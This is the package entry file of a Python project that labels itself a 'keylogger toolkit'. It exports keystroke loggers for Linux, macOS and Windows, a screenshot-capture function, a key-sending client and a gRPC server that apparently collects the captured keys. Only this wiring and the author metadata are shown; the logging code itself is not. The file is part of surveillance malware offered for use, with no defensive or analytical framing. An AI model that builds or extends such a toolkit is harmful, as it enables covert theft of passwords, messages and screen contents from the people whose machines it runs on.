from .grpc_serve import KeylogServer
from .cln import send_key_non_blocking as send_key
from .linlog import loggerFunction as loggerFunctionLinux
from .maclog import loggerFunction as loggerFunctionMac
from .winlog import loggerFunction as loggerFunctionWindows
from .capture import take_screenshot as global_screencapture
__all__ = [
    'send_key',
    'loggerFunctionLinux',
    'loggerFunctionMac',
    'loggerFunctionWindows',
    'global_screencapture',
    'KeylogServer',
]
__version__ = '1.0.0'
__author__ = 'pengux8 (aka) wail sari bey'
__description__ = 'keylogger toolkit'

